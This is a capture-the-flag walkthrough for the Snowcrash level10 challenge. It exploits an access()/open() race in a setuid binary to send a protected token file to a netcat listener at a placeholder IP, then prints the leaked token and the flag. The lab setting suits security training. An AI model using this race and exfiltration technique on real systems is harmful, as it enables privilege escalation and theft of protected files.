# <center>Snowcrash level10</center>

# Explanations

<br/>

## On VM:
> $ ls -l
>>-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10<br/>
>>-rw-------  1 flag10 flag10     26 Mar  5  2016 token

> $ ./level10
>> ./level10 file host<br/>
>>	sends file to host if you have access to it

> $ echo "test" > /tmp/test<br/>
> $ ./level10 /tmp/test localhost
>> Connecting to localhost:6969 .. Unable to connect to host localhost

> $ nm -u ./level10
>>U access@@GLIBC_2.0<br/>
>>U open@@GLIBC_2.0<br/>

- We are going to use the moment between the right check of the file "access()" and the opening "open()".
- We will create a loop that will make a switch between a link to a file in /tmp and the right token.

<br/>

## On your computer:
> $ nc -lk 6969

<br/>

## On VM:
- Copy the loop.sh script to the /tmp/ folder
> $ /tmp/loop.sh&<br/>
> $ while true; do ./level10 /tmp/token <IP_COMPUTER>; done

<br/>

## On your computer:
- Retrieve the output of the nc command
> $
>> woupa2yuojeeaaed06riuj63c

<br/>

## On VM:
> $ su flag10<br/>
> $ woupa2yuojeeaaed06riuj63c<br/>
> $ getflag<br/>
>> feulo4b72j7edeahuete3no7c